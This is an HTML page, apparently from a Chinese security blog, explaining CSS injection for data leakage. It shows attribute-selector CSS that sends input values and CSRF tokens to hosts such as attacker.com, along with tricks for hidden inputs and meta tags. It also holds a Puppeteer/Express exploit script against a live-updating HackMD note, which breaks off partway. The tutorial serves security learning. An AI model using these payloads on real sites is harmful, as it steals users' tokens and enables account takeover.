@@ -1,0 +1,1575 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="s3ven&#39;s blog" />
+  
+  
+  
+  <title>
+    
+      通过 CSS Injection 实现信息泄露 
+      
+      
+      |
+    
+     s3ven&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">通过 CSS Injection 实现信息泄露</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+          2023-12-13
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="../../categories/skill/" title="Skill">
+                    Skill
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="../../tags/css/" title="CSS">
+                    #CSS
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>CSS Injection 通过利用 <code>CSS Selectors</code> 匹配和选择页面元素的功能来实现页面信息的泄露</p>
+<h2 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1. 基础用法"></a>1. 基础用法</h2><p>假设此时 <code>target.com</code> 的目标靶机上存在以下内容</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>somevalue<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
+<p>如果想要得到 input 元素的 value，我们可以在 <code>target.com</code> 上加载如下 css ：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[value^=a]</span><span class="token punctuation">&#123;</span>
+    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">input[value^=b]</span><span class="token punctuation">&#123;</span>
+    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">/* ... */</span>
+<span class="token selector">input[value^=9]</span><span class="token punctuation">&#123;</span>
+    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=9<span class="token punctuation">)</span></span><span class="token punctuation">;</span>   
+<span class="token punctuation">&#125;</span></code></pre>
+<p><code>value^=X</code> 是一个 <code>CSS Selectors</code> 表达式，它将匹配所有目标类型中包含属性 value 且其值以前缀 <code>X</code> 开头的元素，同时使用目标样式渲染被选择的元素。</p>
+<p>由于样式中指定了 <code>background-image: url()</code> ，这将触发页面对目标 url <code>attacker.com/?value=s</code> 的 HTTP 请求，此时我们通过在 <code>attacker.com</code> 上的请求日志就可以得知 value 以 <code>s</code> 开头，</p>
+<p>然后我们重新加载 <code>target.com</code> ，但使用如下 CSS：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[value^=sa]</span><span class="token punctuation">&#123;</span>
+    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=sa<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">input[value^=sb]</span><span class="token punctuation">&#123;</span>
+    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=sb<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">/* ... */</span>
+<span class="token selector">input[value^=s9]</span><span class="token punctuation">&#123;</span>
+    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://attacker.com/?value=s9<span class="token punctuation">)</span></span><span class="token punctuation">;</span>   
+<span class="token punctuation">&#125;</span></code></pre>
+<p>这会导致页面请求 <code>attacker.com/?value=so</code>,<br>最终，在重复此模式几次后，最终请求 <code>attacker.com/?value=somevalue</code> 将允许我们了解目标页面中 input 元素的 value 属性值。</p>
+<h2 id="2-减少规则数量"><a href="#2-减少规则数量" class="headerlink" title="2. 减少规则数量"></a>2. 减少规则数量</h2><p>由于 CSS Selectors 包含 <code>value*=X</code> 表达式，<br>可以匹配任何包含属性 value 且其值包含 <code>X</code> 字符的元素，<br>因此我们可以预先确定组成目标属性值的字符集，来减少获得目标属性值所需的规则数量。</p>
+<p>例如，上面的样例中仅使用了字符“s,o,m,e,v,a,l,u,e”，<br>因此我们可以减少所需的规则数量至每个字符9个规则。</p>
+<h2 id="3-加速泄露"><a href="#3-加速泄露" class="headerlink" title="3. 加速泄露"></a>3. 加速泄露</h2><p>如果目标信息过长，逐字元泄露的速度可能过慢，<br>事实上，我们可以一次泄露两个字元：<br>由于 CSS Selectors 不仅包含 prefix selector: <code>value^=X</code>，<br>还包含 suffix selector: <code>value$=X</code> 表达式，<br>因此我们可以这样来一次获取两个字元：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="a"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=a<span class="token punctuation">)</span></span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">input[name="secret"][value^="b"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=b<span class="token punctuation">)</span></span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">// ...
+input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=a<span class="token punctuation">)</span></span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">input[name="secret"][value$="b"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=b<span class="token punctuation">)</span></span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>注意此处前后缀选择器的两个属性需要分别使用 <code>background</code> 和 <code>border-background</code>，<br>因为如果使用同一属性，在多次匹配到相同元素样式时仅最后一个会生效并会被请求</p>
+<h2 id="4-meta-标签-信息泄露"><a href="#4-meta-标签-信息泄露" class="headerlink" title="4. meta 标签 信息泄露"></a>4. meta 标签 信息泄露</h2><p>由于部分信息会被网站存储于 meta 标签中，<br>而 meta 标签在页面中往往是处于不可见的状态的，<br>大部分浏览器不会渲染不可见的 meta 标签，<br>因此它的样式的外部资源不会被浏览器检索，<br>使用常规的 <code>background-imageurl</code> 方法在 <code>attacker.com</code> 上不会收到任何请求，<br>但是我们可以通过 CSS 让这个元素变为可见状态：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">meta</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">meta[name="csrf-token"][content^="a"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>但是如果进行尝试，我们发现请求还是被没有送出，<br>这是因为 meta 在 head 底下，而 head 也有预设的 <code>display:none</code> 属性，<br>因此也要给 head 设置可见样式，才能让 meta 可见：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">head, meta</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">meta[name="csrf-token"][content^="a"]</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h2 id="5-绕过-type-hidden-属性限制"><a href="#5-绕过-type-hidden-属性限制" class="headerlink" title="5. 绕过 type&#x3D;hidden 属性限制"></a>5. 绕过 type&#x3D;hidden 属性限制</h2><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/action<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>abc123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>
+<p>在以上示例中，由于 input 元素的 type 是 hidden，所以这个元素不会显示在页面上，<br>与 meta 标签一样，大部分浏览器不会渲染 type 为 hidden 的元素，<br>因此该元素样式的外部资源不会被浏览器检索，我们在 <code>attacker.com</code> 上也就不会收到任何请求。<br>而这个限制非常严格，就算用 <code>display:block !important;</code> 也没办法覆盖</p>
+<p>这个问题可以通过 CSS 中的 相邻同级组合器 （+）和 通用同级组合器（~）来解决</p>
+<h3 id="5-1-CSS-相邻同级组合器（-）"><a href="#5-1-CSS-相邻同级组合器（-）" class="headerlink" title="5.1 CSS 相邻同级组合器（+）"></a>5.1 CSS 相邻同级组合器（+）</h3><blockquote>
+<p>相邻同级组合器选择器允许您选择紧跟在一个特定元素之后的元素。</p>
+</blockquote>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p + p</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">/* 选择一个段落之后的同级且继承于它的所有段落 */</span></code></pre>
+
+<p><img src="image-1.png" alt="image-1.png"></p>
+<h3 id="5-2-CSS-通用同级组合器（-）"><a href="#5-2-CSS-通用同级组合器（-）" class="headerlink" title="5.2 CSS 通用同级组合器（~）"></a>5.2 CSS 通用同级组合器（~）</h3><blockquote>
+<p>通用同级运算器选择器与刚才的相邻同级运算器选择器非常相似。<br>不同之处在于，被选中的元素不需要立即继承第一个元素，而是可以出现在它之后的任何位置。</p>
+</blockquote>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p ~ p</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">/* 选择一个段落之后同级的所有段落 */</span></code></pre>
+<p>如果我们使用与上面相同的示例结构，最后一个 <code>&lt;p&gt;</code>元素也将由 p ~ p 选择，因为它前面是另一个 <code>&lt;p&gt;</code> 元素，即使不是直接的。</p>
+<p><img src="image-2.png" alt="image-2.png"></p>
+<p>利用 相邻同级组合器 （+）和 通用组合运算器（~），<br>我们可以渲染与  <code>input[type=hidden]</code> 同级的其他没有 <code>type=hidden</code> 属性的 input 元素，<br>来实现通过 <code>background-imageurl</code> 的信息泄露，从而绕过 <code>type=hidden</code> 限制</p>
+<h3 id="5-3-CSS-has-选择器"><a href="#5-3-CSS-has-选择器" class="headerlink" title="5.3 CSS :has 选择器"></a>5.3 CSS :has 选择器</h3><p>不难发现，相邻同级组合器和通用同级组合器只能在目标 <code>type=hidden</code> 的元素之后存在没有 <code>type=hidden</code> 标记的同级元素时才能实现信息泄露，<br>而如果目标元素之后不存在满足条件的同级元素时，我们则需要使用 :has 选择器来实现信息泄露</p>
+<blockquote>
+<p>:has 选择器 可以选择包含特定内容的元素。<br>例如，<code>a:has(img)</code>可以选择所有包含子元素<code>&lt;img&gt;</code>的<code>&lt;a&gt;</code>元素。</p>
+</blockquote>
+<p>因此，我们可以利用以下 CSS：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">form:has(input[name="csrf-token"][value^="a"])</span><span class="token punctuation">&#123;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com?q=a<span class="token punctuation">)</span></span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>该 CSS 将选中包含符合条件的 input 的 form ，并将其渲染为对应样式，<br>由于被渲染的元素为 <code>form</code> ，故可以绕过 input 的 hidden 属性来实现信息泄露</p>
+<h2 id="6-实时更新-Style-信息泄露"><a href="#6-实时更新-Style-信息泄露" class="headerlink" title="6. 实时更新 Style 信息泄露"></a>6. 实时更新 Style 信息泄露</h2><p>在上述示例中，如果目标信息在页面重新加载后更新会重置，<br>我们将只能使用 CSS 获取目标信息的第一个字元。</p>
+<p>而在以下示例 HackMD 中 CSRF token 在重新加载后会更新，<br>而示例 HackMD 支持 Style 样式的实时更新，<br>也就是说，只要内容变了，会立刻反映在其他 client 的画面上，<br>因此可以做到不重新加载而实时更新style。</p>
+<h3 id="6-1-步骤"><a href="#6-1-步骤" class="headerlink" title="6.1 步骤"></a>6.1 步骤</h3><ol>
+<li>准备好泄露第一个字元的 CSS Payload，插入到 HackMD 里</li>
+<li>受害者打开页面</li>
+<li>服务器收到泄露第一个字元的请求</li>
+<li>从服务器更新 HackMD 内容，换成泄露第二个字元的 Payload</li>
+<li>受害者页面即时更新，载入新的 Style</li>
+<li>服务器收到第二个字元的请求</li>
+<li>不断循环直到整个目标信息被泄露</li>
+</ol>
+<p><img src="image-3.png" alt="image-3.png"></p>
+<h3 id="6-2-Payload"><a href="#6-2-Payload" class="headerlink" title="6.2 Payload"></a>6.2 Payload</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Create a hackMD document and let anyone can view/edit</span>
+<span class="token keyword">const</span> noteUrl <span class="token operator">=</span> <span class="token string">'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf'</span>
+<span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token string">'http://localhost:3000'</span>
+<span class="token keyword">const</span> baseUrl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">'/extract?q='</span>
+<span class="token keyword">const</span> port <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span>
+
+<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setViewport</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">width</span><span class="token operator">:</span> <span class="token number">1280</span><span class="token punctuation">,</span> <span class="token literal-property property">height</span><span class="token operator">:</span> <span class="token number">800</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setRequestInterception</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  page<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token parameter">request</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment">// cancel request to self</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>baseUrl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      request<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      request<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Listening at http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Waiting for server to get ready...'</span><span class="token punctuation">)</span>
+    <span class="token function">startExploit</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> page<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">startExploit</span><span class="token punctuation">(</span><span class="token parameter">app<span class="token punctuation">,</span> page</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> currentToken <span class="token operator">=</span> <span class="token string">''</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>noteUrl <span class="token operator">+</span> <span class="token string">'?edit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  
+  <span class="token comment">// @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">addStyleTag</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">"&#123;scroll-behavior: auto !important;&#125;"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">const</span> initialPayload <span class="token operator">=</span> <span class="token function">generateCss</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token keyword">await</span> <span class="token function">updateCssPayload</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> initialPayload<span class="token punctuation">)</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server is ready, you can open </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>noteUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">?view on the browser</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+
+  app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/extract'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> query <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>query<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">query: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>query<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, progress: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>query<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/36</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+    currentToken <span class="token operator">=</span> query
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'over'</span><span class="token punctuation">)</span>
+      <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token function">generateCss</span><span class="token punctuation">(</span>currentToken<span class="token punctuation">)</span>
+    <span class="token function">updateCssPayload</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">updateCssPayload</span><span class="token punctuation">(</span><span class="token parameter">page<span class="token punctuation">,</span> payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">'.CodeMirror-line'</span><span class="token punctuation">)</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">down</span><span class="token punctuation">(</span><span class="token string">'Meta'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">press</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">up</span><span class="token punctuation">(</span><span class="token string">'Meta'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">press</span><span class="token punctuation">(</span><span class="token string">'Backspace'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>
+  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">sendCharacter</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Updated css payload, waiting for next request'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">generateCss</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> csrfTokenChars <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>prefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
